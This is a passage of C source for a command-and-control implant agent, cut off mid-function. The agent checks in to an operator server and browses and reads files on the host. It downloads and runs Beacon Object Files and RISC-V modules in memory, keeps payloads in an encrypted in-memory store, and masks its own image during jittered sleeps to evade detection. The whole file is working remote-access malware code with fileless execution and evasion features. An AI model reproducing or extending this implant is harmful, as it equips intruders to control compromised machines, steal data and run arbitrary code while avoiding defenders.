/*
 * agent.c — reference hosted C agent.
 *
 * Ties the protocol layers together into a runnable agent:
 *   embedded config -> crypto backend -> selected transport -> session flow.
 * It checks in with the same host profile the Go agent reports
 * (agentutils.GatherSystemDetails, see sysinfo.c), brings up the message
 * tunnel, runs the filesystem/navigation commands the operator expects
 * (`ls`/`ls_dir` as CBOR []util.Dentry, `stat` as CBOR util.FileStat, `pwd`,
 * `cd`, `cat`) plus the in-memory file commands, and returns output like the
 * Go agent's NotifyC2. It reconnects with fresh check-ins when the C2 drops the
 * tunnel and masks the idle periods between poll windows. This is the binary
 * the e2e test drives against the real C2.
 *
 * The encrypted CBOR config and the build-wide magic string are rendered at
 * build time by the Go C2 (lib/cagent, compiled via the Makefile's CONFIG_SRC)
 * and linked as ordinary data; embedded_config.h declares the symbols.
 */

#define _POSIX_C_SOURCE 200809L

#include "protocol.h"

#include "agent_args.h"
#include "agent_identity.h"
#include "stager_iface.h"

#ifndef C2_AGENT_ENABLE_BOF
#define C2_AGENT_ENABLE_BOF 1
#endif
#ifndef C2_AGENT_ENABLE_RVVM
#define C2_AGENT_ENABLE_RVVM 1
#endif

#if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
#include "bof.h"
#endif
#if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
#include "module.h"
#endif
#if C2_AGENT_ENABLE_RVVM
#include "rvvm.h"
#endif
#include "embedded_config.h"
#include "gzip.h"
#include "memfile.h"
#include "sysinfo.h"

#include "cbor_util.h"

#include "cbor.h"

#include <dirent.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

#ifdef C2_AGENT_TRACE
#define TRACE(...)                                                             \
  do {                                                                         \
    fprintf(stderr, __VA_ARGS__);                                              \
    fflush(stderr);                                                            \
  } while (0)
#else
#define TRACE(...)                                                             \
  do {                                                                         \
  } while (0)
#endif

/* Weak defaults overridden by the generated config_embedded.c. An agent
 * built without a config links but cannot decrypt and exits at startup. */
__attribute__((weak)) const uint8_t c2_embedded_config[] = {0};
__attribute__((weak)) const size_t c2_embedded_config_len = 0;
__attribute__((weak)) const uint8_t c2_magic_string[] = {0};
__attribute__((weak)) const size_t c2_magic_string_len = 0;
__attribute__((weak)) const char c2_build_version[] = "N/A";

/* Drop a const build-time blob once its contents are no longer needed. The
 * page is briefly writable and immediately returned to read-only; this never
 * touches executable code. */
static void wipe_rodata(const void *ptr, size_t len) {
  if (ptr == NULL || len == 0)
    return;
  long page = sysconf(_SC_PAGESIZE);
  if (page <= 0)
    return;
  uintptr_t addr = (uintptr_t)ptr;
  uintptr_t start = addr & ~((uintptr_t)page - 1);
  uintptr_t end = (addr + len + (uintptr_t)page - 1) & ~((uintptr_t)page - 1);
  if (mprotect((void *)start, (size_t)(end - start), PROT_READ | PROT_WRITE) !=
      0)
    return;
  memset((void *)ptr, 0, len);
  (void)mprotect((void *)start, (size_t)(end - start), PROT_READ);
}

/* ------------------------------------------------------------------------- */
/* Output buffer + builtin commands */
/* ------------------------------------------------------------------------- */

typedef struct {
  char *p;
  size_t len;
  size_t cap;
} obuf;

static void obuf_append(obuf *b, const char *s, size_t n) {
  if (b->len + n + 1 > b->cap) {
    size_t cap = b->cap ? b->cap * 2 : 256;
    while (cap < b->len + n + 1)
      cap *= 2;
    char *np = (char *)realloc(b->p, cap);
    if (np == NULL)
      return;
    b->p = np;
    b->cap = cap;
  }
  memcpy(b->p + b->len, s, n);
  b->len += n;
  b->p[b->len] = '\0';
}

/*
 * Idle between C2 lifecycles. The stager owns the mask and publishes its entry
 * point beside the agent; the call runs on this thread after the image has been
 * made writable and XORed. If no mask stub was installed, a supervising parent
 * can reclaim the process instead. The agent has no worker threads of its own;
 * any future worker must be joined before this point, because nothing may run
 * agent code while the image is masked.
 */
static void agent_sleep(const c2_agent_config *cfg, unsigned secs) {
  /* The stager publishes the mask next to the agent. Use it whenever it is
   * present, even if an older embedded config forgot to set IsRunByStager;
   * a standalone agent has no valid GS block, so bind simply fails. */
  if (c2_stager_mask_available() && c2_stager_masked_sleep(secs) == 0)
    return;
  /* No in-place masker: a supervising parent reclaims the process instead. */
  if (cfg->is_run_by_stager && c2_agent_identity_supervisor_present())
    exit(0);
  struct timespec ts = {(time_t)secs, 0};
  nanosleep(&ts, NULL);
}

/* The C agent masks the idle gap between poll windows. The default profile is
 * 30-60s of masked sleep, matching the shipped C agent config. */
#define C2_DEFAULT_POLL_INTERVAL 60
#define C2_DEFAULT_POLL_WINDOW 5
#define C2_DEFAULT_JITTER_PERCENT 50
#define C2_MAX_POLL_INTERVAL 86400

static unsigned c2_poll_interval_seconds(const c2_agent_config *cfg) {
  int32_t interval = cfg != NULL ? cfg->poll_interval : 0;
  if (interval <= 0)
    interval = C2_DEFAULT_POLL_INTERVAL;
  if (interval > C2_MAX_POLL_INTERVAL)
    interval = C2_MAX_POLL_INTERVAL;
  return (unsigned)interval;
}

/* Mirror the Go HTTP-poll jitter: sleep in [interval*(1-jitter%), interval]. */
static unsigned c2_poll_sleep_seconds(const c2_crypto_backend *be,
                                      const c2_agent_config *cfg) {
  unsigned interval = c2_poll_interval_seconds(cfg);
  int32_t jitter = cfg != NULL ? cfg->jitter : 0;
  if (jitter <= 0)
    jitter = C2_DEFAULT_JITTER_PERCENT;
  if (jitter > 100)
    jitter = 100;

  uint32_t span = (uint32_t)(((uint64_t)interval * (uint32_t)jitter) / 100u);
  if (span == 0)
    return interval;

  uint32_t r = 0;
  if (be == NULL || be->random == NULL ||
      be->random(be->ctx, (uint8_t *)&r, sizeof r) != 0)
    r = (uint32_t)time(NULL);
  unsigned secs = interval - (r % (span + 1));
  return secs == 0 ? 1 : secs;
}

static int cmd_eq(c2_str a, const char *b) {
  if (a.len == 0 || a.ptr == NULL)
    return 0;
  size_t bl = strlen(b);
  if (a.len != bl)
    return 0;
  return memcmp(a.ptr, b, bl) == 0;
}

/* util.Dentry / util.FileStat CBOR keys, matching the Go structs the C2
 * decodes (controllers.ParseLSOutput / ParseStatOutput). */
enum {
  DENT_NAME = 1,
  DENT_FTYPE = 2,
  DENT_SIZE = 3,
  DENT_DATE = 4,
  DENT_OWNER = 5,
  DENT_PERM = 6,
};
enum { FSTAT_NAME = 1, FSTAT_PERM = 2, FSTAT_CHECKSUM = 3, FSTAT_SIZE = 4 };

static void mode_string(mode_t m, char out[11]) {
  char type = '-';
  if (S_ISDIR(m))
    type = 'd';
  else if (S_ISLNK(m))
    type = 'L';
  else if (S_ISCHR(m))
    type = 'c';
  else if (S_ISBLK(m))
    type = 'b';
  else if (S_ISFIFO(m))
    type = 'p';
  else if (S_ISSOCK(m))
    type = 'S';
  out[0] = type;
  static const mode_t bits[9] = {0400, 0200, 0100, 0040, 0020,
                                 0010, 0004, 0002, 0001};
  static const char rwx[9] = {'r', 'w', 'x', 'r', 'w', 'x', 'r', 'w', 'x'};
  for (int i = 0; i < 9; i++)
    out[1 + i] = (m & bits[i]) ? rwx[i] : '-';
  if (m & S_ISUID)
    out[3] = (m & 0100) ? 's' : 'S';
  if (m & S_ISGID)
    out[6] = (m & 0010) ? 's' : 'S';
  if (m & 01000)
    out[9] = (m & 0001) ? 't' : 'T';
  out[10] = '\0';
}

static void fmt_date(time_t t, char *out, size_t cap) {
  struct tm tm;
  if (localtime_r(&t, &tm) == NULL ||
      strftime(out, cap, "%Y-%m-%d %H:%M:%S", &tm) == 0)
    snprintf(out, cap, "N/A");
}

static int is_mem_path(const char *p) {
  return strncmp(p, C2_MEMFILE_PREFIX, strlen(C2_MEMFILE_PREFIX)) == 0;
}

/* Append one util.Dentry map to an in-progress CBOR array. */
static c2_status dentry_add(CborEncoder *arr, const char *name,
                            const char *ftype, const char *size,
                            const char *date, const char *perm) {
  CborEncoder map;
  c2_status st = c2_cbor_ec(cbor_encoder_create_map(arr, &map, 5));
  if (st != C2_OK)
    return st;
  if ((st = c2_cbor_write_text(&map, DENT_NAME,
                               c2_str_of(name, strlen(name)))) != C2_OK)
    return st;
  if ((st = c2_cbor_write_text(&map, DENT_FTYPE,
                               c2_str_of(ftype, strlen(ftype)))) != C2_OK)
    return st;
  if ((st = c2_cbor_write_text(&map, DENT_SIZE,
                               c2_str_of(size, strlen(size)))) != C2_OK)
    return st;
  if ((st = c2_cbor_write_text(&map, DENT_DATE,
                               c2_str_of(date, strlen(date)))) != C2_OK)
    return st;
  if ((st = c2_cbor_write_text(&map, DENT_PERM,
                               c2_str_of(perm, strlen(perm)))) != C2_OK)
    return st;
  return c2_cbor_ec(cbor_encoder_close_container(arr, &map));
}

/* `ls [--dst DIR] [DIR]`: CBOR []util.Dentry, exactly like the Go agent's
 * LsPath so the C2's controllers.ParseLSOutput can render it. */
static void run_ls(const c2_memfile *mem, const char *dir, obuf *out) {
  size_t cap = 1u << 20;
  uint8_t *buf = (uint8_t *)malloc(cap);
  if (buf == NULL) {
    obuf_append(out, "ls failed\n", 10);
    return;
  }
  CborEncoder enc;
  cbor_encoder_init(&enc, buf, cap, 0);
  CborEncoder arr;
  c2_status st =
      c2_cbor_ec(cbor_encoder_create_array(&enc, &arr, CborIndefiniteLength));

  if (is_mem_path(dir)) {
    size_t plen = strlen(dir);
    int is_root = (plen == strlen(C2_MEMFILE_PREFIX));
    for (size_t i = 0; st == C2_OK && mem != NULL && i < c2_memfile_count(mem);
         i++) {
      const char *k = c2_memfile_key_at(mem, i);
      if (k == NULL || (!is_root && strncmp(k, dir, plen) != 0))
        continue;
      char sizebuf[48];
      snprintf(sizebuf, sizeof(sizebuf), "%zu bytes",
               c2_memfile_plain_len_at(mem, i));
      st = dentry_add(&arr, k, "file (mem)", sizebuf, "N/A", "-rw-------");
    }
  } else {
    struct stat sb;
    if (stat(dir, &sb) == 0 && !S_ISDIR(sb.st_mode)) {
      const char *base = strrchr(dir, '/');
      base = base ? base + 1 : dir;
      char sizebuf[48], date[64], perm[11];
      snprintf(sizebuf, sizeof(sizebuf), "%lld bytes", (long long)sb.st_size);
      fmt_date(sb.st_mtime, date, sizeof(date));
      mode_string(sb.st_mode, perm);
      st = dentry_add(&arr, base, "file", sizebuf, date, perm);
    } else {
      DIR *d = opendir(dir);
      if (d == NULL) {
        free(buf);
        obuf_append(out, "cannot open directory\n", 22);
        return;
      }
      struct dirent *e;
      while (st == C2_OK && (e = readdir(d)) != NULL) {
        char full[1024];
        if (snprintf(full, sizeof(full), "%s/%s", dir, e->d_name) >=
            (int)sizeof(full))
          continue;
        struct stat es;
        if (stat(full, &es) != 0)
          continue;
        char sizebuf[48], date[64], perm[11];
        snprintf(sizebuf, sizeof(sizebuf), "%lld bytes", (long long)es.st_size);
        fmt_date(es.st_mtime, date, sizeof(date));
        mode_string(es.st_mode, perm);
        st = dentry_add(&arr, e->d_name, S_ISDIR(es.st_mode) ? "dir" : "file",
                        sizebuf, date, perm);
      }
      closedir(d);
    }
  }

  if (st == C2_OK)
    st = c2_cbor_ec(cbor_encoder_close_container(&enc, &arr));
  if (st == C2_OK)
    obuf_append(out, (const char *)buf,
                cbor_encoder_get_buffer_size(&enc, buf));
  else
    obuf_append(out, "ls failed\n", 10);
  free(buf);
}

/* `stat [--dst|--path PATH]`: CBOR util.FileStat. */
static void run_stat(const char *path, obuf *out) {
  struct stat sb;
  if (stat(path, &sb) != 0) {
    obuf_append(out, "Error: cant stat file\n", 24);
    return;
  }
  const char *base = strrchr(path, '/');
  base = base ? base + 1 : path;
  char perm[11];
  mode_string(sb.st_mode, perm);

  uint8_t buf[512];
  CborEncoder enc, map;
  cbor_encoder_init(&enc, buf, sizeof(buf), 0);
  if (c2_cbor_ec(cbor_encoder_create_map(&enc, &map, 4)) != C2_OK) {
    obuf_append(out, "stat failed\n", 12);
    return;
  }
  c2_cbor_write_text(&map, FSTAT_NAME, c2_str_of(base, strlen(base)));
  c2_cbor_write_text(&map, FSTAT_PERM, c2_str_of(perm, strlen(perm)));
  c2_cbor_write_text(&map, FSTAT_CHECKSUM, c2_str_of("N/A", 3));
  c2_cbor_write_int(&map, FSTAT_SIZE, (int64_t)sb.st_size);
  if (c2_cbor_ec(cbor_encoder_close_container(&enc, &map)) != C2_OK) {
    obuf_append(out, "stat failed\n", 12);
    return;
  }
  obuf_append(out, (const char *)buf, cbor_encoder_get_buffer_size(&enc, buf));
}

static void run_cd(const char *path, obuf *out) {
  if (path[0] == '\0' || chdir(path) != 0) {
    obuf_append(out, "cd error\n", 9);
    return;
  }
  char cwd[512];
  if (getcwd(cwd, sizeof(cwd)) != NULL) {
    obuf_append(out, cwd, strlen(cwd));
    obuf_append(out, "\n", 1);
  }
}

static void run_pwd(obuf *out) {
  char cwd[512];
  if (getcwd(cwd, sizeof(cwd)) != NULL) {
    obuf_append(out, "current working directory: ", 27);
    obuf_append(out, cwd, strlen(cwd));
    obuf_append(out, "\n", 1);
  }
}

static void run_mem_ls(const c2_memfile *mem, obuf *out) {
  for (size_t i = 0; i < c2_memfile_count(mem); i++) {
    const char *k = c2_memfile_key_at(mem, i);
    obuf_append(out, k, strlen(k));
    obuf_append(out, "\n", 1);
  }
}

static void run_mem_read(c2_memfile *mem, const char *key, obuf *out) {
  uint8_t *data = NULL;
  size_t len = 0;
  c2_status st =
      c2_memfile_read_alloc(mem, c2_str_of(key, strlen(key)), &data, &len);
  if (st != C2_OK) {
    obuf_append(out, "read failed\n", 12);
    return;
  }
  obuf_append(out, (const char *)data, len);
  free(data);
}

/* `cat`: a memfs key is read through the cache, anything else off disk. */
static void run_cat(const char *path, obuf *out) {
  FILE *f = fopen(path, "rb");
  if (f == NULL) {
    obuf_append(out, "read failed\n", 12);
    return;
  }
  char buf[4096];
  size_t n;
  while ((n = fread(buf, 1, sizeof(buf), f)) > 0)
    obuf_append(out, buf, n);
  fclose(f);
}

/* `download <name>`: fetch over the www route and cache in memfs (transparent
 * gzip + AES-GCM), mirroring the Go agent's DownloadViaC2 + cacheToMemFS. */
static void run_download(c2_agent_session *s, c2_memfile *mem, const char *name,
                         obuf *out) {
  size_t cap = 16u * 1024u * 1024u;
  uint8_t *buf = (uint8_t *)malloc(cap);
  if (buf == NULL) {
    obuf_append(out, "download failed\n", 16);
    return;
  }
  size_t len = 0;
  c2_status st =
      c2_session_download(s, c2_str_of(name, strlen(name)), buf, cap, &len);
  if (st == C2_OK) {
    char key[512];
    size_t kl = c2_memfile_key(name, strlen(name), key, sizeof(key));
    st =
        kl ? c2_memfile_write(mem, c2_str_of(key, kl), buf, len) : C2_ERR_NOMEM;
  }
  free(buf);
  obuf_append(out, st == C2_OK ? "downloaded\n" : "download failed\n",
              st == C2_OK ? 11 : 16);
}

#if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
static const char *c2_arch_name(void) {
  struct utsname un;
  memset(&un, 0, sizeof(un));
  if (uname(&un) != 0)
    return "amd64";
  if (strcmp(un.machine, "x86_64") == 0)
    return "amd64";
  if (strcmp(un.machine, "aarch64") == 0)
    return "arm64";
  if (strcmp(un.machine, "i686") == 0 || strcmp(un.machine, "i386") == 0)
    return "386";
  if (strcmp(un.machine, "riscv64") == 0)
    return "riscv64";
  return "amd64";
}

/* Memfs key of an in-memory dependency image: memfs:///<module>.so. */
static int dependency_key(const char *module, char *key, size_t cap) {
  int n = snprintf(key, cap, "memfs:///%s.so", module);
  return (n < 0 || (size_t)n >= cap) ? -1 : n;
}

/*
 * Ensure an in-memory dependency module is resident in memfs, downloading the
 * C2-hosted <module>.<arch>.gz on first use. This is the Linux analogue of the
 * Windows COFFLoader DLL dependency and is shared by every dependency the
 * agent maps itself (the BOF loader and the RV32 interpreter).
 */
static c2_status ensure_dependency(c2_agent_session *s, c2_memfile *mem,
                                   const char *module) {
  char key[128];
  int key_len = dependency_key(module, key, sizeof(key));
  if (key_len < 0)
    return C2_ERR_NOMEM;

  uint8_t *probe = NULL;
  size_t probe_len = 0;
  if (c2_memfile_read_alloc(mem, c2_str_of(key, (size_t)key_len), &probe,
                            &probe_len) == C2_OK) {
    free(probe);
    return C2_OK;
  }

  char name[96];
  int n = snprintf(name, sizeof(name), "%s.%s.gz", module, c2_arch_name());
  if (n < 0 || (size_t)n >= sizeof(name))
    return C2_ERR_NOMEM;
  size_t gz_cap = 8u * 1024u * 1024u;
  uint8_t *gz = (uint8_t *)malloc(gz_cap);
  if (gz == NULL)
    return C2_ERR_NOMEM;
  size_t gz_len = 0;
  c2_status st =
      c2_session_download(s, c2_str_of(name, (size_t)n), gz, gz_cap, &gz_len);
  if (st != C2_OK) {
    free(gz);
    return st;
  }

  size_t so_cap = 16u * 1024u * 1024u;
  uint8_t *so = (uint8_t *)malloc(so_cap);
  if (so == NULL) {
    free(gz);
    return C2_ERR_NOMEM;
  }
  size_t so_len = 0;
  st = c2_gzip_decompress(gz, gz_len, so, so_cap, &so_len);
  free(gz);
  if (st == C2_OK)
    st = c2_memfile_write(mem, c2_str_of(key, (size_t)key_len), so, so_len);
  free(so);
  return st;
}

/* Read a dependency image that ensure_dependency() put in memfs. */
static c2_status load_dependency(c2_memfile *mem, const char *module,
                                 uint8_t **img, size_t *len) {
  char key[128];
  int key_len = dependency_key(module, key, sizeof(key));
  if (key_len < 0)
    return C2_ERR_NOMEM;
  return c2_memfile_read_alloc(mem, c2_str_of(key, (size_t)key_len), img, len);
}
#endif

#if C2_AGENT_ENABLE_BOF
/* Run one BOF object already in memory through the coffloader_linux
 * dependency. `tokens` are the packed-arg tokens c2_bof_pack_args consumes. */
static void execute_bof(c2_agent_session *s, c2_memfile *mem,
                        const uint8_t *bof, size_t bof_len,
                        const char *export_name, const c2_str *tokens,
                        size_t tokenc, obuf *out) {
  if (ensure_dependency(s, mem, "coffloader_linux") != C2_OK) {
    obuf_append(out, "bof: coffloader_linux unavailable\n", 34);
    return;
  }
  uint8_t *loader = NULL;
  size_t loader_len = 0;
  if (load_dependency(mem, "coffloader_linux", &loader, &loader_len) != C2_OK) {
    obuf_append(out, "bof: coffloader_linux unavailable\n", 34);
    return;
  }

  size_t packed_cap = 4;
  for (size_t i = 0; i < tokenc; i++)
    packed_cap += 8 + tokens[i].len * 4;
  uint8_t *packed = (uint8_t *)malloc(packed_cap);
  size_t packed_len = 0;
  char *result = NULL;
  c2_status st = C2_OK;
  if (packed == NULL) {
    st = C2_ERR_NOMEM;
  } else if (tokenc > 0) {
    st = c2_bof_pack_args(tokens, tokenc, packed, packed_cap, &packed_len);
  }
  if (st == C2_OK)
    st =
        c2_bof_run(loader, loader_len, bof, bof_len,
                   (export_name != NULL && export_name[0]) ? export_name : "go",
                   packed, packed_len, &result);
  if (st == C2_OK && result != NULL) {
    obuf_append(out, result, strlen(result));
    free(result);
  } else if (result != NULL) {
    obuf_append(out, "bof: ", 5);
    obuf_append(out, result, strlen(result));
    obuf_append(out, "\n", 1);
    free(result);
  } else if (st != C2_OK) {
    obuf_append(out, "bof: run failed\n", 16);
  }
  free(packed);
  free(loader);
}

/* `bof <object> [export] [args...]`: run a Linux relocatable BOF through the
 * coffloader_linux dependency. Args are prefixed tokens (i/s/z/Z/b); when the
 * first optional token starts with such a prefix it is an argument and the
 * export defaults to "go". */
static void run_bof(c2_agent_session *s, c2_memfile *mem,
                    const c2_str_list *cmd, obuf *out) {
  char object[512];
  c2_cmd_argn(cmd, 1, object, sizeof(object));
  if (!object[0]) {
    obuf_append(out, "bof: missing object\n", 20);
    return;
  }

  char export_name[64] = "go";
  size_t arg_start = 2;
  if (cmd->count > 2 && cmd->items[2].len > 0) {
    char c0 = cmd->items[2].ptr[0];
    if (c0 != 'i' && c0 != 's' && c0 != 'z' && c0 != 'Z' && c0 != 'b') {
      size_t n = cmd->items[2].len;
      if (n >= sizeof(export_name))
        n = sizeof(export_name) - 1;
      memcpy(export_name, cmd->items[2].ptr, n);
      export_name[n] = '\0';
      arg_start = 3;
    }
  }

  char key[512];
  size_t key_len = c2_memfile_key(object, strlen(object), key, sizeof(key));
  uint8_t *bof = NULL;
  size_t bof_len = 0;
  if (key_len == 0 || c2_memfile_read_alloc(mem, c2_str_of(key, key_len), &bof,
                                            &bof_len) != C2_OK) {
    obuf_append(out, "bof: object not found\n", 22);
    return;
  }
  execute_bof(s, mem, bof, bof_len, export_name, &cmd->items[arg_start],
              cmd->count - arg_start, out);
  free(bof);
}

#endif /* C2_AGENT_ENABLE_BOF */

#if C2_AGENT_ENABLE_RVVM
/* Fetch a module companion into memfs and return its plaintext bytes. The
 * file is verified, decompressed and stored in encrypted memfs. */
static c2_status fetch_companion(c2_agent_session *s, c2_memfile *mem,
                                 const c2_module_file *f, uint8_t **out,
                                 size_t *out_len) {
  size_t gz_cap = 32u * 1024u * 1024u;
  uint8_t *gz = (uint8_t *)malloc(gz_cap);
  if (gz == NULL)
    return C2_ERR_NOMEM;
  size_t gz_len = 0;
  c2_status st = c2_session_download(s, c2_str_of(f->name, strlen(f->name)), gz,
                                     gz_cap, &gz_len);
  if (st != C2_OK) {
    free(gz);
    return st;
  }
  if (f->checksum[0] != '\0') {
    uint8_t digest[C2_SHA256_BYTES];
    if (s->be->sha256 == NULL ||
        s->be->sha256(s->be->ctx, gz, gz_len, digest) != 0) {
      free(gz);
      return C2_ERR_IO;
    }
    char hex[C2_SHA256_BYTES * 2 + 1];
    c2_hex_encode(digest, sizeof(digest), hex);
    hex[C2_SHA256_BYTES * 2] = '\0';
    if (!c2_str_eq_ci(hex, f->checksum)) {
      free(gz);
      return C2_ERR_PROTO;
    }
  }
  uint8_t *lib = (uint8_t *)malloc(gz_cap);
  if (lib == NULL) {
    free(gz);
    return C2_ERR_NOMEM;
  }
  size_t lib_len = 0;
  st = c2_gzip_decompress(gz, gz_len, lib, gz_cap, &lib_len);
  free(gz);
  if (st != C2_OK) {
    free(lib);
    return st;
  }
  char key[512];
  size_t kl = c2_memfile_key(f->name, strlen(f->name), key, sizeof(key));
  if (kl == 0) {
    free(lib);
    return C2_ERR_NOMEM;
  }
  st = c2_memfile_write(mem, c2_str_of(key, kl), lib, lib_len);
  free(lib);
  if (st != C2_OK)
    return st;
  return c2_memfile_read_alloc(mem, c2_str_of(key, kl), out, out_len);
}

/* Run one RV32 BOF object already in memory through the rvvm_linux
 * dependency. `entry` is the export ("" means "go") and `bof_args` is the
 * packed COFF argument buffer. */
static void execute_rv(c2_agent_session *s, c2_memfile *mem,
                       const uint8_t *image, size_t image_len,
                       const char *entry, const uint8_t *bof_args,
                       size_t bof_len, const c2_rv_lib *libs, size_t nlibs,
                       obuf *out) {
  if (ensure_dependency(s, mem, "rvvm_linux") != C2_OK) {
    obuf_append(out, "rv: rvvm_linux unavailable\n", 27);
    return;
  }
  uint8_t *loader = NULL;
  size_t loader_len = 0;
  if (load_dependency(mem, "rvvm_linux", &loader, &loader_len) != C2_OK) {
    obuf_append(out, "rv: rvvm_linux unavailable\n", 27);
    return;
  }

  char *result = NULL;
  c2_status st = c2_rv_run(loader, loader_len, image, image_len, entry,
                           bof_args, bof_len, libs, nlibs, &result);
  if (st == C2_OK && result != NULL) {
    obuf_append(out, result, strlen(result));
    free(result);
  } else if (result != NULL) {
    obuf_append(out, "rv: ", 4);
    obuf_append(out, result, strlen(result));
    obuf_append(out, "\n", 1);
    free(result);
  } else if (st != C2_OK) {
    obuf_append(out, "rv: run failed\n", 15);
  }
  free(loader);
}
#endif /* C2_AGENT_ENABLE_RVVM */

#if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
/* `!custom_module --mod_name X --type coff --file_to_download Y.gz
 *  --checksum <sha256> --invocation <base64 CBOR>`: the C2's module dispatch.
 * Download + verify + decompress the payload, decode the invocation, run the
 * payload in memory. */
static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
                              const c2_str_list *cmd, obuf *out) {
  char mod_name[128] = "";
  char type[32] = "";
  char file[512] = "";
  char checksum[128] = "";
  c2_cmd_pick_flag(cmd, "--mod_name", mod_name, sizeof(mod_name));
  c2_cmd_pick_flag(cmd, "--type", type, sizeof(type));
  c2_cmd_pick_flag(cmd, "--file_to_download", file, sizeof(file));
  c2_cmd_pick_flag(cmd, "--checksum", checksum, sizeof(checksum));

  size_t inv_cap = 256u * 1024u;
  char *invocation = (char *)malloc(inv_cap);
  if (invocation == NULL) {
    obuf_append(out, "custom_module: out of memory\n", 28);
    return;
  }
  c2_cmd_pick_flag(cmd, "--invocation", invocation, inv_cap);

  int supported = 0;
#if C2_AGENT_ENABLE_BOF
  if (c2_str_eq_ci(type, "coff"))
    supported = 1;
#endif
#if C2_AGENT_ENABLE_RVVM
  if (c2_str_eq_ci(type, "rv"))
    supported = 1;
#endif
  if (!supported) {
    obuf_append(out, "custom_module: unsupported module type\n", 37);
    free(invocation);
    return;
  }
  if (file[0] == '\0' || invocation[0] == '\0') {
    obuf_append(out, "custom_module: missing args\n", 27);
    free(invocation);
    return;
  }

  size_t gz_cap = 32u * 1024u * 1024u;
  uint8_t *gz = (uint8_t *)malloc(gz_cap);
  if (gz == NULL) {
    obuf_append(out, "custom_module: out of memory\n", 28);
    free(invocation);
    return;
  }
  size_t gz_len = 0;
  c2_status st = c2_session_download(s, c2_str_of(file, strlen(file)), gz,
                                     gz_cap, &gz_len);
  if (st != C2_OK) {
    TRACE("[agent] custom_module: download %s failed: %d\n", file, st);
    obuf_append(out, "custom_module: download failed\n", 30);
    free(gz);
    free(invocation);
    return;
  }

  if (checksum[0] != '\0') {
    uint8_t digest[C2_SHA256_BYTES];
    if (s->be->sha256 == NULL ||
        s->be->sha256(s->be->ctx, gz, gz_len, digest) != 0) {
      obuf_append(out, "custom_module: checksum unavailable\n", 35);
      free(gz);
      free(invocation);
      return;
    }
    char hex[C2_SHA256_BYTES * 2 + 1];
    c2_hex_encode(digest, sizeof(digest), hex);
    hex[C2_SHA256_BYTES * 2] = '\0';
    if (!c2_str_eq_ci(hex, checksum)) {
      obuf_append(out, "custom_module: checksum mismatch\n", 32);
      free(gz);
      free(invocation);
      return;
    }
  }

  size_t obj_cap = 64u * 1024u * 1024u;
  uint8_t *obj = (uint8_t *)malloc(obj_cap);
  if (obj == NULL) {
    obuf_append(out, "custom_module: out of memory\n", 28);
    free(gz);
    free(invocation);
    return;
  }
  size_t obj_len = 0;
  st = c2_gzip_decompress(gz, gz_len, obj, obj_cap, &obj_len);
  free(gz);
  if (st != C2_OK) {
    obuf_append(out, "custom_module: decompress failed\n", 32);
    free(obj);
    free(invocation);
    return;
  }

  size_t tokbuf_cap = 64u * 1024u;
  char *tokbuf = (char *)malloc(tokbuf_cap);
  if (tokbuf == NULL) {
    obuf_append(out, "custom_module: out of memory\n", 28);
    free(obj);
    free(invocation);
    return;
  }

#if C2_AGENT_ENABLE_RVVM
  if (c2_str_eq_ci(type, "rv")) {
    /* An rv payload is a portable BOF: an RV32 relocatable object that the
     * interpreter relocates against its embedded runtime. */
    char export_name[64] = "";
    c2_str tokens[64];
    size_t tokenc = 0;
    size_t tokbuf_used = 0;
    st = c2_coff_invocation_parse(invocation, strlen(invocation), export_name,
                                  sizeof(export_name), tokens, &tokenc,
                                  sizeof(tokens) / sizeof(tokens[0]), tokbuf,
                                  tokbuf_cap, &tokbuf_used);
    c2_module_file mfiles[C2_MODULE_FILE_MAX];
    size_t nmfiles = 0;
    if (st == C2_OK)
      st = c2_module_files_parse(invocation, strlen(invocation), mfiles,
                                 &nmfiles);
    free(invocation);
    if (st != C2_OK || export_name[0] == '\0') {
      obuf_append(out, "custom_module: rv module has no coff_export\n", 45);
      free(tokbuf);
      free(obj);
      return;
    }

    size_t packed_cap = 4;
    for (size_t i = 0; i < tokenc; i++)
      packed_cap += 8 + tokens[i].len * 4;
    uint8_t *packed = (uint8_t *)malloc(packed_cap);
    size_t packed_len = 0;
    if (packed == NULL) {
      st = C2_ERR_NOMEM;
    } else if (tokenc > 0) {
      st = c2_bof_pack_args(tokens, tokenc, packed, packed_cap, &packed_len);
    } else {
      memset(packed, 0, 4);
      packed_len = 4;
    }
    if (st != C2_OK) {
      obuf_append(out, "custom_module: bad invocation\n", 29);
      free(packed);
      free(tokbuf);
      free(obj);
      return;
    }
    /* Companion files are RISC-V libraries delivered with the module. They
     * are fetched into encrypted memfs and passed as in-memory images. */
    c2_rv_lib libs[C2_MODULE_FILE_MAX];
    uint8_t *libbufs[C2_MODULE_FILE_MAX] = {0};
    size_t nlibs = 0;
    for (size_t i = 0; i < nmfiles; i++) {
      uint8_t *lb = NULL;
      size_t ll = 0;
      st = fetch_companion(s, mem, &mfiles[i], &lb, &ll);
      if (st != C2_OK) {
        obuf_append(out, "custom_module: library fetch failed\n", 37);
        for (size_t k = 0; k < nlibs; k++)
          free(libbufs[k]);
        free(packed);
        free(tokbuf);
        free(obj);
        return;
      }
      libbufs[nlibs] = lb;
      libs[nlibs].buf = lb;
      libs[nlibs].len = ll;
      nlibs++;
    }
    TRACE("[agent] custom_module %s: rv BOF %zu args export=%s libs=%zu\n",
          mod_name, tokenc, export_name, nlibs);
    execute_rv(s, mem, obj, obj_len, export_name, packed, packed_len, libs,
               nlibs, out);
    for (size_t i = 0; i < nlibs; i++)
      free(libbufs[i]);
    free(packed);
    free(tokbuf);
    free(obj);
    return;
  }
#endif

#if C2_AGENT_ENABLE_BOF
  if (c2_str_eq_ci(type, "coff")) {
    char export_name[64] = "go";
    c2_str tokens[64];
    size_t tokenc = 0;
    size_t tokbuf_used = 0;
    st = c2_coff_invocation_parse(invocation, strlen(invocation), export_name,
                                  sizeof(export_name), tokens, &tokenc,
                                  sizeof(tokens) / sizeof(tokens[0]), tokbuf,
                                  tokbuf_cap, &tokbuf_used);
    free(invocation);
    if (st != C2_OK) {
      obuf_append(out, "custom_module: bad invocation\n", 29);
      free(tokbuf);
